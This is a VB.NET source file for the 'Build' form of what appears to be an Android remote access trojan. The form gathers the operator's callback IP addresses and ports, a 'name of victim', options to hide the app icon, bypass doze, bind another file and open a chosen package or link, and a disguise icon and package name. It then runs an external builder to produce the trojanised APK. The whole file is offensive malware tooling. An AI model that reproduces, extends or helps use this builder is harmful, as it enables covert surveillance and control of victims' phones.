Imports System.ComponentModel

Public Class Build

    Private keyback As Boolean

    Private Package_keyback As Boolean

    Private keybackVersion As Boolean = False

    Private spl_arguments As String = "[x0b0x]"

    Private BIND_Path As String = "null"

    Private BIND_EX As String = "null"

    Private intent_ As String = "null"

    Private iconPatch As String = "null"

    Private Programmatically As Boolean

    Private SplitterDNS As String = "[x0DNS0x]"

    Private colo0 As Color = Color.FromArgb(190, 190, 190)

    Private colo1 As Color = Color.FromArgb(20, 20, 20)

    Private tip As New ThemeToolTip
    Sub New()

        InitializeComponent()

        Me.Font = reso.f

    End Sub

    Private Sub b_Add_Click(sender As Object, e As EventArgs) Handles b_Add.Click

        DGV0.Rows.Add(TextIP.Text & ":" & po.Value)

    End Sub


    Private Sub SpyStyle()
        Me.BackColor = SpySettings.DefaultColor_Background

        For Each gr As DataGridView In Panel1.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background

            '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        Next

        For Each gr As NumericUpDown In Panel1.Controls.OfType(Of NumericUpDown)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
            RectInputText0.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        Next
        For Each gr As Label In Panel1.Controls.OfType(Of Label)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Button In Panel1.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As TextBox In Panel1.Controls.OfType(Of TextBox)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
            RectInputText0.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        Next
        For Each gr As Label In Panel3.Controls.OfType(Of Label)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Button In Panel3.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As CheckBox In Panel3.Controls.OfType(Of CheckBox)()
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ForeColor = SpySettings.DefaultColor_Foreground
        Next
        For Each gr As NumericUpDown In Panel3.Controls.OfType(Of NumericUpDown)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
            RectInputText1.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        Next
        For Each gr As TextBox In Panel3.Controls.OfType(Of TextBox)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
            RectInputText1.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        Next
        For Each gr As Button In box.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Panel In box.Controls.OfType(Of Panel)()
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        Me.Refresh()
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Build_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\4.ico")

        SpyStyle()

        Programmatically = True

        TextFutex.Text = GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5)

        TextNameVictim.Text = My.Settings.build_text_name_victim

        TextNamePatch.Text = My.Settings.build_text_name_patch

        TextVersion.Text = My.Settings.build_text_version

        sleep.Value = My.Settings.build_text_sleep

        po.Value = My.Settings.build_text_port

        CheckHide.Checked = My.Settings.build_Checked_hide

        CheckDoze.Checked = My.Settings.build_Checked_doze

        CheckIconPatch.Checked = My.Settings.build_Checked_icon

        iconPatch = My.Settings.build_path_icon

        BIND_Path = My.Settings.BIND_Path

        BIND_EX = My.Settings.BIND_EX

        intent_ = My.Settings.intent

        If intent_ = "null" Then

            CheckOpenPackage.Checked = False

        Else

            CheckOpenPackage.Checked = True

        End If

        If Not IO.File.Exists(BIND_Path) Then

            BIND_Path = "null"

            BIND_EX = "null"

            CheckBIND.Checked = False

        Else

            CheckBIND.Checked = True

        End If

        If Not IO.File.Exists(iconPatch) Then

            If Not iconPatch = "null" Then

                iconPatch = "null"

                CheckIconPatch.Checked = False

            End If

        End If


        Dim DNS As String = My.Settings.build_DGV_list

        If Not DNS = "null" Then

            Dim spl_Lines As String() = DNS.Split({SplitterDNS}, StringSplitOptions.None)

            For Each row In spl_Lines

                If row.Length > 0 Then

                    If row.Contains(":") Then

                        DGV0.Rows.Add(row)

                    End If

                End If

            Next

        End If

        TextIP.Text = Codes.GetIPAddress()

        Programmatically = False

        Me.TOpacity.Interval = SpySettings.T_Interval

        Me.TOpacity.Enabled = True
    End Sub
    Function GenRandom(ByVal Length As Integer)

        Dim Output As String = Nothing

        Dim UsedLetters As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        For i = 1 To Length

            Threading.Thread.Sleep(5)

            Dim Rnd As New Random(Now.Millisecond)

            Output &= UsedLetters(Rnd.Next(0, UsedLetters.Length))

        Next

        Return Output

    End Function

    Private Sub TiMAT_Tick(sender As Object, e As EventArgs) Handles TiMAT.Tick

        TextFutex.Text = GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5) & "-" & GenRandom(5)

    End Sub

    Private Sub TextFutex_MouseHover(sender As Object, e As EventArgs) Handles TextFutex.MouseHover

        TiMAT.Enabled = True

    End Sub

    Private Sub TextFutex_MouseLeave(sender As Object, e As EventArgs) Handles TextFutex.MouseLeave

        TiMAT.Enabled = False

    End Sub

    Private Sub SelectedApk_Click(sender As Object, e As EventArgs) Handles SelectedApk.Click

        If DGV0.Rows.Count = 0 Then

            MsgBox("No contact data", MsgBoxStyle.Exclamation, reso.nameRAT)

        Else

            If TextNameVictim.Text.Length = 0 Then

                MsgBox("name of victim empty", MsgBoxStyle.Exclamation, reso.nameRAT)

            Else

                If TextNamePatch.Text.Length = 0 Then

                    MsgBox("name patch empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                Else

                    If TextVersion.Text.Length = 0 Then

                        MsgBox("version empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                    Else

                        If TextFutex.Text.Length = 0 Then

                            MsgBox("futex empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                        Else


                            If TextFlavor.Text.Length = 0 Then

                                MsgBox("Flavor empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                            Else


                                If TextPackage.Text.Length = 0 Then

                                    MsgBox("Package Name empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                                Else

                                    If TextPackage.Text.Length = 0 Then

                                        MsgBox("Package Name empty", MsgBoxStyle.Exclamation, reso.nameRAT)

                                    Else

                                        If TextPackage.Text.Trim.StartsWith(".") Or TextPackage.Text.Trim.EndsWith(".") Then

                                            MsgBox("Package segments must be of non-zero length", MsgBoxStyle.Exclamation, reso.nameRAT)

                                        Else

                                            If TextFlavor.Text.Trim.EndsWith(".") Then

                                                MsgBox("Flavor segments must be of non-zero length", MsgBoxStyle.Exclamation, reso.nameRAT)

                                            Else

                                                Dim ip, ports, namevictim, namepatch, version, proprty, sleepms, futex, flavor As String

                                                ip = Nothing

                                                ports = Nothing

                                                namevictim = Nothing

                                                namepatch = Nothing

                                                version = Nothing

                                                proprty = Nothing

                                                sleepms = Nothing

                                                futex = Nothing

                                                flavor = Nothing

                                                For Each connection In DGV0.Rows

                                                    Dim ro As String = DirectCast(connection, Windows.Forms.DataGridViewRow).Cells(0).Value.ToString()

                                                    Dim s As String() = ro.ToString.Trim.Split({":"}, StringSplitOptions.None)

                                                    ip &= s(0) & ":"

                                                    ports &= s(1) & ":"

                                                Next

                                                ip = ip.Substring(0, ip.Length - 1)

                                                ports = ports.Substring(0, ports.Length - 1)

                                                namevictim = TextNameVictim.Text

                                                namepatch = TextNamePatch.Text

                                                version = TextVersion.Text

                                                If CheckHide.Checked Then

                                                    proprty &= "1"

                                                Else

                                                    proprty &= "0"

                                                End If

                                                If CheckDoze.Checked Then

                                                    proprty &= "1"

                                                Else

                                                    proprty &= "0"

                                                End If

                                                If CheckBIND.Checked Then

                                                    proprty &= "1"

                                                Else

                                                    proprty &= "0"

                                                End If

                                                If CheckOpenPackage.Checked Then

                                                    proprty &= "1"

                                                Else

                                                    proprty &= "0"

                                                End If

                                                sleepms = CStr(sleep.Value)

                                                futex = TextFutex.Text

                                                flavor = TextFlavor.Text

                                                FilePathApk.Title = "Please select a apk file"

                                                FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

                                                FilePathApk.Filter = "apk Files|*.apk"

                                                FilePathApk.FileName = String.Empty

                                                If FilePathApk.ShowDialog() = DialogResult.OK Then


                                                    Dim i0 As Color = SpySettings.DefaultColor_Background
                                                    Dim i1 As Color = SpySettings.DefaultColor_Foreground
                                                    Dim clr As String = String.Format("{0},{1},{2}|{3},{4},{5}", i0.R, i0.G, i0.B, i1.R, i1.G, i1.B)

                                                    Dim final As String = ip & spl_arguments & ports & spl_arguments & namevictim &
                                                                        spl_arguments & namepatch & spl_arguments & version & spl_arguments & proprty & spl_arguments & sleepms &
                                                                        spl_arguments & futex & spl_arguments & reso.res_Path & "\Lib\platformBinary.zip" &
                                                                        spl_arguments & FilePathApk.FileName & spl_arguments & reso.res_Path & "\Fonts\" &
                                                                        spl_arguments & flavor & spl_arguments & clr & spl_arguments & iconPatch & spl_arguments & My.Settings.FontStyle & spl_arguments & My.Settings.FontSize &
                                                                        spl_arguments & BIND_Path & spl_arguments & BIND_EX & spl_arguments & intent_ & spl_arguments & TextPackage.Text

                                                    Dim p As String = reso.res_Path & "\Lib\build.exe"

                                                    If IO.File.Exists(p) Then

                                                        Dim proc = New ProcessStartInfo()

                                                        proc.FileName = p

                                                        proc.Arguments = final

                                                        proc.WindowStyle = ProcessWindowStyle.Normal

                                                        saveAll()

                                                        System.Diagnostics.Process.Start(proc)

                                                        Me.DialogResult = DialogResult.OK

                                                    Else

                                                        MsgBox("Missing:" & p, MsgBoxStyle.Exclamation, reso.nameRAT)

                                                    End If

                                                End If

                                            End If

                                        End If

                                    End If

                                End If

                            End If

                        End If

                    End If

                End If

            End If

        End If

    End Sub

    Private Sub saveAll()

        My.Settings.build_text_name_victim = TextNameVictim.Text

        My.Settings.build_text_name_patch = TextNamePatch.Text

        My.Settings.build_text_version = TextVersion.Text

        My.Settings.build_text_sleep = sleep.Value

        My.Settings.build_text_port = po.Value

        My.Settings.build_Checked_hide = CheckHide.Checked

        My.Settings.build_Checked_doze = CheckDoze.Checked

        My.Settings.build_Checked_icon = CheckIconPatch.Checked

        My.Settings.build_path_icon = iconPatch

        My.Settings.BIND_Path = BIND_Path

        My.Settings.BIND_EX = BIND_EX

        My.Settings.intent = intent_

        Dim DNS As String = ""

        If DGV0.Rows.Count > 0 Then

            For i As Integer = 0 To DGV0.Rows.Count - 1

                DNS &= DGV0.Rows(i).Cells(0).Value & SplitterDNS

            Next

        Else

            DNS = "null"

        End If

        My.Settings.build_DGV_list = DNS

        My.Settings.Save()

    End Sub

    Private Sub Build_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        If Not TiMAT.Enabled = False Then TiMAT.Enabled = False

        Me.DialogResult = DialogResult.Cancel

    End Sub

    Private Sub TextPackage_TextChanged(sender As Object, e As EventArgs) Handles TextPackage.TextChanged

        Dim scan As String = TextPackage.Text.Trim

        If Package_keyback Then

            If Not scan.Contains(".") Then

                Dim cn As Integer = TextPackage.SelectionStart

                scan = scan.Insert(cn, ".")

                TextPackage.Text = scan

                Try
                    TextPackage.SelectionStart = scan.IndexOf(".")
                Catch x_skipErrors As Exception
                End Try

            End If

        End If


        Try
            If IsNumeric(scan.Chars(0).ToString) Then
                TextPackage.Text = scan.Substring(1, scan.Length - 1)
            End If
        Catch x_skipErrors As Exception

        End Try

        Try

            If IsNumeric(scan.Chars(scan.IndexOf(".") + 1).ToString) Then
                TextPackage.Text = TextPackage.Text.Replace("." & scan.Chars(scan.IndexOf(".") + 1).ToString, ".")
                TextPackage.SelectionStart = scan.IndexOf(".")
            End If
        Catch x_skipErrors As Exception

        End Try

    End Sub

    Private Sub TextPackage_KeyDown(sender As Object, e As KeyEventArgs) Handles TextPackage.KeyDown

        If e.KeyCode = Keys.Back Then

            Package_keyback = True

        Else

            Package_keyback = False

        End If

    End Sub

    Private Sub TextPackage_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextPackage.KeyPress

        If Not TextPackage.SelectionLength = 0 Then

            If TextPackage.SelectedText.Contains(".") Then

                TextPackage.DeselectAll()

                e.Handled = True

                Return

            End If

        End If

        Dim scan As String = TextPackage.Text.Trim

        Dim sKeys As String = "qazwsxedcrfvtgbyhnujmikolp"

        Dim sKeysAll As String = "1234567890qazwsxedcrfvtgbyhnujmikolp"

        If scan.EndsWith(".") Then
            If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

                Return

            End If
        Else
            If Not sKeysAll.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

            End If
        End If

    End Sub

    Private Sub TextFlavor_TextChanged(sender As Object, e As EventArgs) Handles TextFlavor.TextChanged

        Dim scan As String = TextFlavor.Text.Trim

        If scan.Length = 0 Then

            TextFlavor.Text = "."

        Else

            If Not scan.Chars(0) = "." Then

                Dim tag As String = "."

                If scan.Contains(".") Then

                    Dim spl As String() = scan.Split(".")

                    tag = spl(1)

                Else

                    tag = ""

                End If

                TextFlavor.Text = "." & tag

                If tag.Length = 0 Then

                    TextFlavor.SelectionStart = scan.IndexOf(".") + 1

                Else

                    TextFlavor.SelectionStart = scan.IndexOf(".")

                End If


            End If

        End If


        Try

            If IsNumeric(scan.Chars(scan.IndexOf(".") + 1).ToString) Then
                TextFlavor.Text = TextFlavor.Text.Replace("." & scan.Chars(scan.IndexOf(".") + 1).ToString, ".")
                TextFlavor.SelectionStart = scan.IndexOf(".") + 1
            End If
        Catch x_skipErrors As Exception

        End Try

    End Sub

    Private Sub TextFlavor_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextFlavor.KeyPress

        Dim sKeys As String = "1234567890qazwsxedcrfvtgbyhnujmikolp"

        If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not keyback Then

            e.Handled = True

        End If

    End Sub
    Private Sub TextVersion_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextVersion.KeyPress

        If keybackVersion Then

            e.Handled = False

            Return

        End If

        Dim sKeys As String = "1234567890qazwsxedcrfvtgbyhnujmikolp."

        If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) Then

            e.Handled = True

        End If

    End Sub
    Private Sub TextVersion_KeyDown(sender As Object, e As KeyEventArgs) Handles TextVersion.KeyDown

        If e.KeyCode = Keys.Back Then

            keybackVersion = True

        Else

            keybackVersion = False

        End If

    End Sub
    Private Sub TextFlavor_KeyDown(sender As Object, e As KeyEventArgs) Handles TextFlavor.KeyDown

        If e.KeyCode = Keys.Back Then

            keyback = True

        Else

            keyback = False

        End If

    End Sub

    Private Sub sleep_TextChanged(sender As Object, e As EventArgs) Handles sleep.TextChanged

        Dim ts As TimeSpan = TimeSpan.FromMilliseconds(sleep.Value)

        Dim sTime As String = String.Empty

        If Not ts.Days = 0 Then

            sTime &= "Days " & CStr(ts.Days) & vbNewLine

        End If

        If Not ts.Hours = 0 Then

            sTime &= "Hours:" & CStr(ts.Hours) & vbNewLine

        End If

        If Not ts.Minutes = 0 Then

            sTime &= "Minutes:" & CStr(ts.Minutes) & vbNewLine

        End If

        If Not ts.Seconds = 0 Then

            sTime &= "Seconds:" & CStr(ts.Seconds) & vbNewLine

        End If

        If Not ts.Milliseconds = 0 Then

            sTime &= "Millis " & CStr(ts.Milliseconds) & vbNewLine

        End If

        sleep.Tag = If(sTime = String.Empty, "No Delay", sTime)

    End Sub

    Private Sub CheckIconPatch_CheckedChanged(sender As Object, e As EventArgs) Handles CheckIconPatch.CheckedChanged
        If Programmatically Then
            GoTo skip
        End If

        If CheckIconPatch.Checked Then

            Dim A As New Icons

            Dim FileDirectory As New IO.DirectoryInfo(reso.res_Path & "\Icons\Apps")

            Dim icon As IO.FileInfo() = FileDirectory.GetFiles("*.png")

            For Each File As IO.FileInfo In icon

                Dim b As New Bitmap(File.FullName)

                If b.Size.Width = 144 Or b.Size.Width = 192 And b.Size.Height = 144 Or b.Size.Height = 192 Then

                    colo0 = Color.FromArgb(190, 190, 190)
                    colo1 = Color.FromArgb(20, 20, 20)
                    Dim HB As New Drawing2D.HatchBrush(Drawing2D.HatchStyle.LargeCheckerBoard, colo0, colo1)
                    Dim R3 As New Rectangle(0, 0, b.Size.Width, b.Size.Height)
                    Dim bit As New Bitmap(b.Size.Width, b.Size.Height)
                    Using g As Graphics = Graphics.FromImage(bit)
                        g.FillRectangle(HB, R3)
                        g.DrawImage(b, New Rectangle((0), 0, b.Width, b.Height))
                        g.Dispose()
                    End Using

                    Dim row As Integer = A.DGV0.Rows.Add(bit, File.Name, String.Format("{0} x {1}", bit.Size.Width, bit.Size.Height), reso.BytesConverter(CLng(File.Length)))

                    A.DGV0.Rows(row).Tag = File.FullName

                End If

            Next

            A.StartPosition = FormStartPosition.Manual

            A.Location = Codes.FixSize(Me, A)

            Select Case A.ShowDialog(Me)

                Case DialogResult.OK

                    iconPatch = CStr(A.DGV0.Rows(A.id).Tag)

                    A.Close()

                Case Else

                    iconPatch = "null"

                    CheckIconPatch.Checked = False

                    A.Close()

            End Select

        Else

            iconPatch = "null"

        End If


skip:
    End Sub

    Private Sub b_del_Click(sender As Object, e As EventArgs) Handles b_del.Click

        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)

            Next

        End If
    End Sub

    Private Sub btnUp_Click(sender As Object, e As EventArgs) Handles btnUp.Click

        Rowinsert(False)

    End Sub

    Private Sub btnDown_Click(sender As Object, e As EventArgs) Handles btnDown.Click

        Rowinsert(True)

    End Sub
    Private Sub Rowinsert(ByVal isDown As Boolean)

        If DGV0.SelectedRows.Count = 1 And Not DGV0.Rows.Count = 1 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim vul As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Value

                If isDown Then

                    DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)

                    DGV0.Rows.Insert(DGV0.SelectedRows(i).Index + 1, vul)

                    DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index + 1).Cells(0)

                Else

                    If Not DGV0.SelectedRows(i).Index = 0 Then

                        DGV0.Rows.Insert(DGV0.SelectedRows(i).Index - 1, vul)

                        DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index - 1).Cells(0)

                        DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index + 1)

                        DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index - 1).Cells(0)

                    End If

                End If

            Next

        End If

    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText0.Count > 0 Then
            For Each rec In RectInputText0
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If

        Dim clr As Color = Color.FromArgb(150, SpySettings.DefaultColor_Foreground.R,
SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B)
        Dim clrPen As New Pen(clr, 1)
        Dim rect As New Rectangle(0, 0, Panel1.Width - 1, Panel1.Height - 1)
        e.Graphics.DrawRectangle(clrPen, rect)

        'ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, SpySettings.DefaultColor_Foreground, ButtonBorderStyle.Dashed)
    End Sub
    Private Sub Panel3_Paint(sender As Object, e As PaintEventArgs) Handles Panel3.Paint
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText1.Count > 0 Then
            For Each rec In RectInputText1
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If


        Dim clr As Color = Color.FromArgb(150, SpySettings.DefaultColor_Foreground.R,
SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B)
        Dim clrPen As New Pen(clr, 1)
        Dim rect As New Rectangle(0, 0, Panel3.Width - 1, Panel3.Height - 1)
        e.Graphics.DrawRectangle(clrPen, rect)

        'ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, SpySettings.DefaultColor_Foreground, ButtonBorderStyle.Dashed)
    End Sub
    Private Sub PanelVariable_Paint(sender As Object, e As PaintEventArgs)
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText3.Count > 0 Then
            For Each rec In RectInputText3
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If
    End Sub

    Private RectInputText0 As New List(Of Rectangle)
    Private RectInputText1 As New List(Of Rectangle)
    Private RectInputText3 As New List(Of Rectangle)

    Private Sub sleep_MouseUp(sender As Object, e As MouseEventArgs) Handles sleep.MouseUp
        startTime.Enabled = False
        tip._ToolTip.Hide(sleep)
    End Sub
    Private Sub sleep_MouseDown(sender As Object, e As MouseEventArgs) Handles sleep.MouseDown
        startTime.Enabled = True
    End Sub
    Private Sub startTime_Tick(sender As Object, e As EventArgs) Handles startTime.Tick
        tip._ToolTip.RemoveAll()
        If Not tip._ToolTip.Active Then
            tip._ToolTip.Active = True
        End If
        Dim po As Point = sleep.PointToClient(New Point(0, 0))
        tip._ToolTip.Show(CStr(sleep.Tag), sleep, po)
        startTime.Enabled = False
    End Sub

    Private Sub CheckBIND_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBIND.CheckedChanged

        If Programmatically Then
            GoTo skip1
        End If

        If CheckBIND.Checked Then

            FilePathApk.Title = "Select File"

            FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

            FilePathApk.Filter = "All Files|*.*"

            FilePathApk.FileName = String.Empty

            If FilePathApk.ShowDialog() = DialogResult.OK Then

                Dim p As String = FilePathApk.FileName

                If IO.File.Exists(p) Then

                    Try
                        BIND_Path = p

                        Dim f As New IO.FileInfo(BIND_Path)

                        BIND_EX = f.Extension.Remove(0, 1)

                    Catch ex As Exception

                        BIND_Path = "null"

                        BIND_EX = "null"

                        CheckBIND.Checked = False

                    End Try

                End If
            Else
                GoTo skip0
            End If

        Else
skip0:
            BIND_Path = "null"

            BIND_EX = "null"

            CheckBIND.Checked = False

        End If

skip1:

    End Sub

    Private Sub CheckOpenPackage_CheckedChanged(sender As Object, e As EventArgs) Handles CheckOpenPackage.CheckedChanged

        If Programmatically Then
            GoTo skip
        End If

        If CheckOpenPackage.Checked Then

            Dim pd As New inp

            pd.Text = "Merge Advanced"

            pd.LTitle.Text = "Add package name Or website link"

            pd.StartPosition = FormStartPosition.Manual

            pd.Location = Codes.FixSize(Me, pd)

            Select Case pd.ShowDialog(Me)

                Case DialogResult.OK

                    Dim Package As String = pd.InputText.Text

                    If Package.Trim.Length = 0 Then

                        CheckOpenPackage.Checked = False

                        intent_ = "null"

                    Else

                        intent_ = pd.InputText.Text

                    End If

                Case Else

                    CheckOpenPackage.Checked = False

                    intent_ = "null"

            End Select

            pd.Close()

        Else
            CheckOpenPackage.Checked = False

            intent_ = "null"
        End If

skip:

    End Sub
End Class